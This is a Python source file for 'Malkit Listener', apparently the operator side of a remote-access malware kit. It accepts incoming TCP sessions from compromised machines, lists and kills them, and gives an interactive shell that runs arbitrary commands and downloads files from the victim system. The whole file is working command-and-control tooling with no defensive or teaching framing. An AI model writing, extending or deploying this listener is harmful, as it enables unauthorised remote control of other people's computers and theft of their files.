import os
import socket
import sys
import time
import asyncio
import threading
from threading import Thread
from progress.bar import Bar, PixelBar
from progress.spinner import Spinner

sessions = []
alive = True


def transfer(conn, command):
    try:
        conn.send(command.encode())
        grab, src, dst = command.split("::")
        dst_directory = '/'.join(dst.replace("\\", "/").split("/")[:-1])
        print(dst_directory)
        if not dst_directory.endswith("/"):
            dst_directory += "/"
        if not os.path.exists(dst_directory):
            os.makedirs(dst_directory)
        transfer = True
        bits = b""
        while True:
            print("Transferring file...", end="\r")
            bits += conn.recv(1024)
            if bits.startswith(b"File not found"):
                print('[-] Unable to find out the file')
                break
            elif bits.endswith(b"DONE"):
                bits = bits[:-4]
                break
        with open(dst, "wb") as f:
            f.write(bits)
            print(f"File written Successfully at: {dst}")
            return 0
    except Exception as e:
        print(f"Unknown Exception: {e}")
        return 1
    

def die():
    global alive
    alive = False
    os.system("cls")
    spinner = Spinner("Exiting...")
    for i in range(5):
        time.sleep(0.1)
        spinner.next()
    print("\n[+] Done")
    time.sleep(1)
    os.system("cls")
    os._exit(1)


def run_server():
    global alive
    host = "0.0.0.0"
    port = <<PORT>>
    print(f'[+] Listening for income TCP connection on port {port}...\n')
    while alive:
        s = socket.socket()
        
        s.bind((host, port))
        s.listen(10)
        try:
            client, addr = s.accept()
            num = len(sessions)
            session = [num, client, addr, 0]
            sessions.append(session)
        except Exception as err:
            print(err)

def help():
    help_screen = """
Malkit Listener Help Screen!

The commands are split into two categories:
    [Listener commands]: the ones you can use inside the "Listener>" screen.

    [Shell commands]: the ones you can use inside the "Shell>" screen after interacting with a session.

[Listener Commands]
list    -   lists all active sessions in the format: SessionNumber: IP/PORT
interact::SessionNumber    -   Allows you to interact with a session number. Example: interact::0
kill::SessionNumber    -   Kills a specific session number. Example: kill::0
exit    -   Exits the listener, same effect as a KeyboardInterrupt
help    -   Shows this screen 


[Shell Commands]
<bg or <background  -   Backgrounds the current session, allowing you to return to the lister.
<download::RemotePath::LocalPath    -   Downloads a file from the remote system into your local one.
                                        Example: <download::remote_file.txt::savehere/files/downloaded.txt 
exit or <exit   -   Kills the current shell, returning you into the listener

"""
    print(help_screen)
    return 0
def handle_client():
    BACKGROUND = ['background', 'bg']
    global alive
    global sessions

    while alive:
        try:
            com, *arg = input(f"Listener> ").split(" ")
            com = com.lower()
            arg = ''.join(arg).lower()
            if com == "cls" or com == "clear" or com.encode() == b'\x0c':
                try:
                    os.system("cls")
                except:
                    os.system("clear")
            elif com.lower() == "help":
                help()
                continue
            elif com == "exit":
                raise KeyboardInterrupt
            elif com == "list":
                if len(sessions) == 0:
                    print("No sessions at the moment")
                    continue
                for x in sessions:
                    print(f"{x[0]}: {x[2]}")
            elif com == "kill":
                try:
                    int_arg = int(arg)
                    sessions.pop(int_arg)
                except Exception as e:
                    print("error", e)
            elif com.startswith("interact"):
                try:
                    comm, snum = com.split("::")
                    conn = sessions[int(snum)][1]
                except:
                    print("make sure you did it right")
                    continue
                while True:
                    try:
                        command = input(f"[{snum}] Shell>")
                        if command.startswith("exit") or command.startswith("<exit"):
                            sessions.pop(int(snum))
                            break
                        elif command == 'cls' or command == 'clear' or command.encode() == b'\x0c':
                            try:
                                os.system("cls")
                            except:
                                os.system("clear")
                            continue
                        elif command == "<bg" or command == "<background" or command == "exit":
                            print(f"Backgrounded: {snum}")
                            break
                        elif command.startswith('<download'):
                            try:
                                grab, src, dst = command.split("::")
                                transfer(conn, command)
                            except Exception as e:
                                print("Hey, use proper syntax. Example: <download::remotefile::localdestination/localfile.txt")
                            continue
                            
                        elif command.strip() == "":
                            continue
                        elif command.startswith("cd "):
                            conn.send(command.encode())
                            output = b""
                            while True:
                                output += conn.recv(1024)
                                if output.endswith(b"CDDONE"):
                                    print(output.decode().replace("CDDONE", ""))
                                    break
                            continue
                        elif command.lower() == "help":
                            help()
                            continue
                        else:
                            conn.send(command.encode())
                            output = b""
                            while True:
                                output += conn.recv(1024)
                                if output.endswith(b"CMDDONE"):
                                    print(output.decode().replace("CMDDONE", ""))
                                    break                                
                    except WindowsError:
                        break
                    except (KeyboardInterrupt, EOFError):
                        print("")
                        continue
                    except Exception as err:
                        print(f"Shell Error: [{err}]")
                        continue
        except (KeyboardInterrupt, EOFError):
            break
    die()


## Need to add detection of timed out connection!

#def timeout():
#    global sessions
#    while alive:
#        time.sleep(10)
#        com = "pwd"
#
#        for x in sessions:
#            try:
#                conn = x[1]
#                conn.send(com.encode())
#                resp = conn.recv(1024).decode()
#                if len(resp) > 0:
#                    continue
#                else:
#                    sessions.pop(x[0])
#            except Exception as e:
#                print(e)
                #sessions.pop(x[0])


def print_conn():
    global alive
    global sessions

    holder = 0

    while alive:
        time.sleep(2)
        if len(sessions) > holder:
            diff = len(sessions) - holder
            for x in range(diff):
                print(f'\n[+] Got one {sessions[x][0]}, {sessions[x][2]}...\n')
            holder = len(sessions)


def run_alive(queue: list):
    for thread in queue:
        thread.start()


if __name__ == "__main__":
    queue = []

    run_server_thread = Thread(target=run_server)
    print_conn_thread = Thread(target=print_conn)
    #control_timeout = Thread(target=timeout)
    main_server_thread = Thread(target=handle_client)

    run_server_thread.daemon = True
    print_conn_thread.daemon = True

    queue.append(run_server_thread)
    queue.append(print_conn_thread)
    #queue.append(control_timeout)
    queue.append(main_server_thread)

    run_alive(queue)